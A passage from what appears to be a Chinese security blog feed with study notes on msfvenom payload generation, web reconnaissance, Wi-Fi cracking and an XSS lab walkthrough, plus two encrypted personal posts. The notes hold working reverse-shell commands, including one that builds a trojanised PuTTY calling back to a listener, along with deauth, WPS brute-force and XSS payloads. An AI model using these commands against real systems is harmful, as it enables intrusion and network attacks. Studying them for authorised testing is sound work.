solaris, unix, windows 5)可生成的格式root@kali:~# msfvenom --help-formatsExecutable formats asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, warTransform formats bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript 6)查payload选项 ---- --------------- -------- -----------root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp --payload-optionsOptions for payload/windows/x64/meterpreter/reverse_tcp: Name: Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager Module: payload/windows/x64/meterpreter/reverse_tcp Platform: Windows Arch: x64 #是指生成的payload只能在64位系统运行 Needs Admin: No Total size: 449 Rank: NormalProvided by: skape &lt;mmiller@hick.org&gt; sf &lt;stephen_fewer@harmonysecurity.com&gt; OJ ReevesBasic options:Name Current Setting Required Description---- --------------- -------- -----------EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)LHOST yes The listen addressLPORT 4444 yes The listen portDescription: Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64). Connect back to the attacker (Windows x64)Advanced options for payload/windows/x64/meterpreter/reverse_tcp: Name Current Setting Required Description ---- --------------- -------- ----------- AutoLoadStdapi true yes Automatically load the Stdapi extension AutoRunScript no A script to run automatically on session creation. 2.生成payload1)将payload注入到putty中(会被360杀掉）root@kali:~# msfvenom -p windows/xmeterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4443 -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -x /root/putty.exe -k -f exe -o /root/Desktop/putty_evil.exeSkipping invalid encoder x64/shikata_ga_naiNo encoder or badchars specified, outputting raw payloadPayload size: 510 bytesFinal size of exe file: 867840 bytesSaved as: /root/Desktop/putty_evil.exe 2)windows x64(被杀）root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4441 -f exe &gt; shell.exe 3)linuxroot@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.230 LPORT=4441 -f elf &gt; shell.elf]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三秒钟的记忆]]></title>
    <url>%2Fposts%2F11dc13a6.html</url>
    <content type="text"><![CDATA[请输入文章密码！ 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]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[混生活吗？]]></title>
    <url>%2Fposts%2Fd851c108.html</url>
    <content type="text"><![CDATA[请输入文章密码！ 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]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web渗透技术知识小记]]></title>
    <url>%2Fposts%2Fbb6c190a.html</url>
    <content type="text"><![CDATA[渗透脑图1.渗透步骤漏洞 2.渗透思路脑图 信息收集1.域名、ip等信息查询在线网站站长之家seo站长帮手站长统计爱站微步在线天眼查虎妈查githubshadonZoomEy雅虎搜索Dogpile 2.开放的端口查询1.常用的工具1)nmap扫描2)masscan 3.web漏洞查找1.后台查找1）Googlehacksite:xx.com intext:管理 site:xx.com intext: 用户名 密码 site:xx.com inurl:loginsite:xx.com inurl:managesite:xx.com inurl:adminsite:xx.com intitle:后台site:xx.com intitle: 管理 2）御剑2.目录漏洞index of to parent directory 3.工具检测漏洞wvsappscan椰树4.sql注入工具sqlmap 4.系统漏洞查找1.nessus]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无线渗透测试小识]]></title>
    <url>%2Fposts%2F8599fc6c.html</url>
    <content type="text"><![CDATA[监听wifi无线网络中的信号是以广播模式发送的，所有用户就可以在传送管程中截获到这些信息。1.网卡的工作模式无线网卡是采用无线信号进行数据传输的终端。4种模式：广播模式：它的物理地址是0xffffff的帧为广播帧，工作在广播模式的网卡接受广播帧多播传送：多播传送地址作为目的物理地址的帧可以被组内的其他主机同时接收，而组外主机却接收不到。但是如果将网卡设置为多播传送模式，它可以接收所有的多播传送帧，而不论它是不是组内成员。直接模式：工作在混杂模式下的网卡只接收目的地址是自己mac地址的帧。混杂模式：工作在混杂模式下的网卡，接受所有的流过网卡的帧。通信包捕获程序就是在这种模式下运行的。2.iwconfig 查看无线接口的配置信息 ifconfig 查看接口的配置信息 3.Aircrack-ng套件中的小工具aircrack-ng 破解WEP,以及WPA(字典攻击)密钥 airdecap-ng 通过已经知道密钥来解密WEP或WPA嗅探数据 airmon-ng 将网卡设定为监听模式 aireplay-ng 数据包注入工具airodump-ng 数据包嗅探，将无线网络数据输送到PCAP或IVS文件并显示网络信息airtun-ng 创建虚拟管道 airolib-ng 保存、管理ESSID密码列表 packetforge-ng 创建数据包注入用的加密包 Tools 混合、转换工具airbase-ng 软件模拟APairdecloak-ng 消除pcap文件中的WEP加密包 airdriver-ng 无线设备驱动管理工具 airolib-ng 保存、管理ESSID密码列表、计算对应的密钥 airserv-ng 允许不同的进程访问无线网卡buddy-ng easside-ng文件的描述esside-ng 和AP接入点通信（无WEP）tkiptun-ng WPS/TKIP攻击 wesside-ng 自动破解WEP密钥 41）将无线网卡启动监听模式airmon-ng start interface[channel] 启动监听模式airmon-ng stop interface[channel] 关闭监听模式 2）将网卡设置为混杂模式airmon-ng start wlan0 3）扫描网络范围 airodump-ng [选项] wlan0mon-c 指定目标AP的工作信道-i,-ivs 仅保存可用于破解的IVS数据报文 -w 指定一个自己希望保存的文件名，用来保存有效的IVS数据报文 参数解读BSSID 表示无线AP的mac地址 PWR 网卡报告的信号水平，它主要取决于驱动。AP离计算机，信号越高。如果部分客户端的PWR为-1，那么说明该客户端不在当前网卡能监听到的范围内，但是能捕获到AP发往客户端的数据。如果所有的客户端PWR值都为-1，那么说明网卡驱动不支持信号水平报告。 Beasons 无线AP 发出的编号，每个AP在最低速率（1M）时差不多每秒会发送10个左右的beacon。 #Data 被捕捉到的数据分组分量 #/s 过去10秒内每秒捕获数据分组的数量 CH 信道号MB 无线AP所支持的最大速率 ENC 使用的几码算法体系。OPN表示无加密，WEP？表示wep或者wpa/wpa2 CIPHER 检测到的加密算法 AUTH 使用认证协议 常用的有MGT(WPS/WPA2使用独立的认证服务器，平时我们常说的802.1x、radius、eap等),SKA（WEP的共享密钥），PSK(WPA/WPA2的预共享密钥) 或者OPN(WEP开放式） ESSID 也就是所谓的SSID号 STATION 客户端的mac地址 Rate 输出速率 Lost 在过去10秒内丢失的数据分组，基于序列号检测。 Frames 客户端发送的数据分组数量 Probe v被客户端查探的ESSID. 5强制客户端下线mdk3 interface mode options mode： 指定测试模式。 a dos模式 b beacon洪水模式 d 解除验证/解除关联暴力模式 f mac过滤暴力模式 g wpa 降级测试 m 关闭开发 p 基本探测和ESSID暴力模式w WIDS/WIPS混乱 x 802.1测试 例子：mdk3 mon0 d -s 120 0 -c 1,6,11 分析数据包1.过滤比较运算符eq ==ne !=gt &gt;lt &lt;ge &gt;=vle &lt;= 1)ip过滤ip.addr==ip ip.src_host==ip 显示来源ip ip.dst_host==ip 显示目标ip 2)端口过滤 tcp.port tcp.dstport==80tcp.srcport==80 3)协议过滤udp arp icmp http smtp ftp dns msnms ip ssl 等 排除udp !udp或者not udp 4)包长度过滤udp.length==26 udp本身固定长度8加上udp下面那块数据包之和tcp.len&gt;=7 表示ip数据包(tcp下面那块数据）不包括tcp本身 ip.len==94 除了以太网头固定长度14，其他都是ip.len,即从ip本身到最后 frame.len==119 表示整个数据包长度，从eth开始到最后 5)http模式过滤指定get包http.request.method=="GET" &amp;&amp; http contains "host"http.request.method=="GET" &amp;&amp; http contains "User-Agent" 指定post包 如上指定响应包http contains "HTTP/1.1 200 OK" &amp;&amp; http contains "Content-Type:" 6)表达式 !(arp.src==192.168.1.1) and !(arp.dst.proto_ipv4==192.168.1.11 2.802.11数据结构无线数据包和有限数据包的主要不同在于额外的802.11头部。这是一个第二层的头部，包含与数据包和传输介质有关的额外信息。802.11数据包的三种类型：管理帧、控制帧、数据帧分析特定的包类型wc.fc.type_subtype 分析特定频率的包radiotap.channel.freq信道 中心频率 1 24122 231713 2472 3.wep认证包4.wpa认证包5.RSSI 显示捕获数据包的射频信号强度 TX Rate 显示捕获数据包的数据率 Frequency/Channel 显示捕获数据包的频率和信道6 qq使用ociq协议 WPS加密1.wps支持两种模式：个人识别码模式和按钮模式2.wps在某些设备上也是QQS3.reaver是一个暴力破解wps加密的工具将无线网卡设置为监听模式例子：已知PIN码是12345678reaver -i mon0 -b ap的mac地址 -p 12345678 不知时，暴力破解reaver -i mon0 -b ap的mac地址 -vv 4.wifite是一款自动化wep和wpa破解工具启动WiFitewifite -pps 660 ctrl +c 停止扫描选择ap编号5.fern wifr cracker 可以破解并恢复wep、wpa和wps的无线网络密码fern-wifi-cracker WEP加密模式1.wpd加密认证类型：开放系统认证共享密钥认证2.Aircrack-ng工具主要是用于网络侦测、数据包嗅探以及wep和wpa/wpa2-pskf破解。1)查看系统中的无限网路接口iwconfig 2)将该无线网卡设置为监听模式airmon-ng start mon0 3)扫描附近的wifi网络airodump-ng wlan0mon0 4)选择wep模式加密的目标,捕获数据包，生成wireless-o1.ivs文件airodump-ng --ivs -w wireless --bssid ap的mac -c 6 wlan0mon --ivs 设置过滤，保存可用于破解的ivs包 -w 指定捕获数据包要保存的文件名 --bssid 来指定攻击目标的BSSID -c 指定攻击目标ap的工作频道 5）捕获一定的数据包后，开始进行破解aircrack-ng wireless-01.ivs 3.wifite工具，进行破解 WPA加密模式1.crunch 1 6 abcdef -o password.txt 2.pwgen工具可以说横溢难以忘记的随机密码或容易记住的密码pwgen -1 -y 3.RainbowCrack创建彩虹表rtgen 彩虹表生成工具，生成口令、散列值对照表 rtsort 排序彩虹表，为rcrack提供输入 rcrack 使用排好序的彩虹表进行口令破解 例子：1)创建一个md5算法加密的彩虹表,文件保存在/usr/share/rainbowcrack下。rtgen md5 numeric 5 5 0 100 200 0 2）对生成的彩虹表进行排序 rtsort md5_numeric#5-5_0_100x200_0.rt 3)破解哈希值md5(11111)= b0baee9d279d34fa1dfd71aadb908c3frcrack md5_numeric#5-5_0_100x200_0.rt -h b0baee9d279d34fa1dfd71aadb908c3f 4.Aircrack-ng工具破解修改当前无线网卡的mac地址1）查看本机无线网络接口airmon-ng 2)停止无线网络接口airmon-ng stop wlan0 3)修改无线网卡的mac地址为00:11:22:33:44:55macchanger --mac 00:11:22:33:44:55 4)启用无线网络接口arimon-ng start wlan0 5)捕获数据包airodump-ng wlan0mon 6)捕获test无线网络的数据包，成功捕获握手包后，生成的文件名为wpa-01.capairodump-ng -c 1 -w wpa -bssid 目标ap的mac wlan0mon` 如果一直没有捕获到握手包 可以使用aireplay-ng命令进行Deauth攻击，强制客户端重新连接到wifi网络aireplay-ng -0 1 -a ap的mac地址 -c 客户端的mac地址 wlan0mon 7)Deauth攻击aireplay-ng -0 1 -a ap的mac地址 -c 客户端的mac地址 wlan0mon 8）破解密码aircrack-ng -w dic 捕获的cap文件 5.wifitewifite -dict passowrd.txt WPA+RADIUS加密模式 参考文章: http://www.tup.tsinghua.edu.cn/booksCenter/book_06720901.html]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss闯关小游戏]]></title>
    <url>%2Fposts%2Fc617af63.html</url>
    <content type="text"><![CDATA[附上网址 https://xss-quiz.int21h.jp/ stage 1没有过滤直接输入&lt;script&gt;alert(document.domain);&lt;/script&gt; stage 2闭合双引号，闭合标签。" onmouseover=alert(document.domain)&gt; stage 3用bp抓一下包，第一个参数过滤了，第二个没有。p1=123p2=&lt;script&gt;alert(document.domain);&lt;/script&gt; stage 4第三个参数没有过滤hackme"&gt; &lt;script&gt; alert(document.doamin);&lt;/script&gt; stage 5首先要修改输入框的长度限制&quot;/&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;a&gt;&quot; stage 6链接&quot; onmousemove=&quot;alert(document.domain) stage 7链接这里的”&lt;&gt;都被转义了&quot; onmouseover=alert(document.domain) stage 8链接伪协议:javascript:alert(document.domain); stage 9链接“&lt;&gt;都被转义了，当然也不能用onmouseover和onclick，根据提示，用UTF-7编码解码工具，将” onmousemove=”alert(document.domain)转为UTF-7编码：p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7 这个对使用的IE浏览器有一定的限制，大部分浏览器都已经修复了这个漏洞，但IE7还没有 因为没有IE7，所以这里直接用firebox直接弹框 stage 10链接 查看源码知道过滤了domain &quot;&gt;&lt;script&gt;alert(document.doadoaminmin)&lt;/script&gt;&lt;&quot; stage 11 链接 hint: &quot;s/script/xscript/ig;&quot; and &quot;s/on[a-z]+=/onxxx=/ig;&quot; and &quot;s/style=/stxxx=/ig;&quot; 过滤了挺多的 